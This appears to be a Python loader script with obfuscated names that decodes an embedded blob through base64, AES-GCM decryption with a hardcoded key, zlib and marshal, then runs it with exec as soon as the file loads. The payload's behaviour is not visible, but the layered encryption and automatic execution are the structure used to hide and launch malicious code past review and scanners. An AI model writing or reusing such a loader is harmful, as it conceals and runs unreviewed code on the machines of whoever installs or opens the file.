
import base64
import marshal
import zlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
import sys

def decrypt_code(encoded_code, key):
    decoded_encoded_code = base64.b64decode(encoded_code).decode()
    decoded = base64.b64decode(decoded_encoded_code)
    nonce, tag, ct = decoded[:16], decoded[16:32], decoded[32:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    decrypted_padded = cipher.decrypt_and_verify(ct, tag)
    decrypted_code = unpad(decrypted_padded, AES.block_size)
    decompressed_code = zlib.decompress(decrypted_code)
    return marshal.loads(decompressed_code)


def nogsWw2hvJ5P():
    global TEKvav2ISqrf
    TEKvav2ISqrf = base64.b64decode(b'2JZpBKTuHjkFbpxJxckj30jn6XxqkLzSeIY203CoB0Q=')
    encrypted_code = base64.b64decode(b'YUdoaU1FWkRXRlZ0WVc1c1RURTJlU3QzYUZBeFRIZHdUelJIY205RGJYaExSVzkyUlU1aWFUUlBhRW8xZGxsMGNUQldMMEpVUmxkd1UxSTJSM2xrU0RKcVZFMXRkRkpMWTJGbVRFdG5Na0pGU0ZONlMwdFJZaXRHV25KNmFXcDNkR2hNWVM5T2IyVnhlalZLYVdZelNISk5NSFJQTWpGNWNUbGFVakZUZDFwNldEZERTVXhLTHpSd1VFMUpja2R5ZG5KUFlYSnVjbVp3ZW0xRVNGSk5kVWg0VHpCc2JsVTViM05vVnk4MWVXVnlRaXRwWlU1Q01rUXhkVVo2ZEVaTU5VOTFlR1Z4VUhNclFtOVhPVmhUVGxORGR6aDZaejA5')
    decrypted_code = decrypt_code(encrypted_code, TEKvav2ISqrf)
    exec(decrypted_code)

nogsWw2hvJ5P()
